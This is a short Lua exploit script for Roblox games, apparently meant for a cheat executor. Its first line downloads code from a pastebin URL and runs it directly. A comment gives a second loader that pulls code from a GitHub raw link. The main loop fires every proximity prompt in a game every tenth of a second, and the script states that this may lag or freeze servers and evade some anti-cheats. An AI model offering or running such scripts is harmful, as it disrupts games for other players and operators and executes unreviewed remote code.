loadstring(game:HttpGet('https://pastebin.com/raw/tZJF8g3K'))()
--< Loadstring: loadstring(game:HttpGet('https://raw.githubusercontent.com/xrtzrr/scripts/main/LoopFireAllProximityPrompts.lua'))()
--< Game: Universal
--< Functionality: Allows you to loop fire every single proximity prompt in-game, causing a game to lag or freeze possibly. Some anti-cheats built in-game might detect this.

while true do
    wait(.1)
for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("ProximityPrompt") then
				fireproximityprompt(v)
end
end
end
